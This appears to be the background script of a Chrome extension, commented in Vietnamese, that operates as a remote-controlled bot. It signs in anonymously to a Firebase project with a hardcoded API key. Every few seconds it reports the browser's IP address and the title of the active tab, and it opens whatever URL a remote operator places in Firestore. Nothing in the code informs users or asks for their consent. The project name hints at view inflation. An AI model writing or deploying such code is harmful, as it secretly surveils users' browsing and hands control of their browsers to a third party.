// Cấu hình Firebase
const config = {
    apiKey: "AIzaSyCI0wVECyeYYPXxs_OoN3So0-C_OsVuhiU",
    projectId: "view-yt-bc69d"
};

const appId = "extension-remote-control";
let deviceId = null;
let startTime = null;
let lastProcessedTime = 0; 
let idToken = null;
let cachedIP = "0.0.0.0";

// 1. Lấy dữ liệu cố định từ bộ nhớ Chrome
async function getPersistentData() {
    return new Promise((resolve) => {
        chrome.storage.local.get(['deviceId', 'startTime', 'lastProcessedTime'], (result) => {
            let data = { ...result };
            let changed = false;

            if (!result.deviceId) {
                data.deviceId = 'dev_' + Math.random().toString(36).substr(2, 9);
                changed = true;
            }
            if (!result.startTime) {
                data.startTime = new Date().toISOString();
                changed = true;
            }
            if (!result.lastProcessedTime) {
                data.lastProcessedTime = 0;
            }
            
            if (changed) {
                chrome.storage.local.set(data, () => resolve(data));
            } else {
                resolve(data);
            }
        });
    });
}

// 2. Đăng nhập ẩn danh qua REST API
async function signInAnonymous() {
    try {
        const url = `https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${config.apiKey}`;
        const resp = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ returnSecureToken: true })
        });
        const data = await resp.json();
        if (data.idToken) {
            idToken = data.idToken;
            return true;
        }
        return false;
    } catch (e) { 
        return false;
    }
}

// 3. Lấy IP hiện tại
async function fetchInitialIP() {
    try {
        const resp = await fetch('https://api.ipify.org?format=json');
        const data = await resp.json();
        cachedIP = data.ip;
    } catch (e) { }
}

// Hàm lấy tiêu đề tab đang mở
async function getActiveTabInfo() {
    return new Promise((resolve) => {
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
            if (tabs && tabs[0]) {
                resolve({
                    title: tabs[0].title || "Không có tiêu đề",
                    url: tabs[0].url || ""
                });
            } else {
                resolve({ title: "Đang ẩn trình duyệt", url: "" });
            }
        });
    });
}

// 4. Cập nhật trạng thái Online (Heartbeat) - Đã thêm ActiveTitle
async function sendHeartbeat(status = "online") {
    if (!deviceId || !startTime) return;
    if (!idToken && !(await signInAnonymous())) return;

    // Lấy thông tin trang web đang xem
    const tabInfo = await getActiveTabInfo();

    const url = `https://firestore.googleapis.com/v1/projects/${config.projectId}/databases/(default)/documents/artifacts/${appId}/public/data/devices/${deviceId}?updateMask.fieldPaths=status&updateMask.fieldPaths=ip&updateMask.fieldPaths=lastSeen&updateMask.fieldPaths=id&updateMask.fieldPaths=startTime&updateMask.fieldPaths=activeTitle`;
    
    const body = {
        fields: {
            id: { stringValue: deviceId },
            status: { stringValue: status },
            ip: { stringValue: cachedIP },
            lastSeen: { timestampValue: new Date().toISOString() },
            startTime: { timestampValue: startTime },
            activeTitle: { stringValue: tabInfo.title } // Gửi tiêu đề trang web
        }
    };

    try {
        const resp = await fetch(url, {
            method: 'PATCH',
            headers: { 
                'Authorization': `Bearer ${idToken}`,
                'Content-Type': 'application/json' 
            },
            body: JSON.stringify(body)
        });
        if (resp.status === 401) idToken = null; 
    } catch (e) { idToken = null; }
}

// 5. Kiểm tra lệnh mở URL
async function checkCommands() {
    if (!idToken || !deviceId) return;
    const url = `https://firestore.googleapis.com/v1/projects/${config.projectId}/databases/(default)/documents/artifacts/${appId}/public/data/devices/${deviceId}`;
    try {
        const resp = await fetch(url, { headers: { 'Authorization': `Bearer ${idToken}` } });
        if (!resp.ok) return;
        const data = await resp.json();
        if (data.fields && data.fields.targetUrl && data.fields.commandTime) {
            const targetUrl = data.fields.targetUrl.stringValue;
            const commandTime = Number(data.fields.commandTime.integerValue || data.fields.commandTime.doubleValue || 0);
            if (commandTime > lastProcessedTime) {
                lastProcessedTime = commandTime;
                chrome.storage.local.set({ lastProcessedTime: commandTime });
                chrome.tabs.create({ url: targetUrl });
            }
        }
    } catch (e) { }
}

if (chrome.alarms) {
    chrome.alarms.onAlarm.addListener((alarm) => {
        if (alarm.name === 'heartbeat_alarm') {
            sendHeartbeat("online");
            checkCommands();
        }
    });
}

async function main() {
    const data = await getPersistentData();
    deviceId = data.deviceId;
    startTime = data.startTime;
    lastProcessedTime = data.lastProcessedTime || 0;

    await fetchInitialIP();
    await signInAnonymous();
    await sendHeartbeat("online");
    
    if (chrome.alarms) chrome.alarms.create('heartbeat_alarm', { periodInMinutes: 1 });
    setInterval(() => sendHeartbeat("online"), 15000);
    setInterval(checkCommands, 2000);
}

main();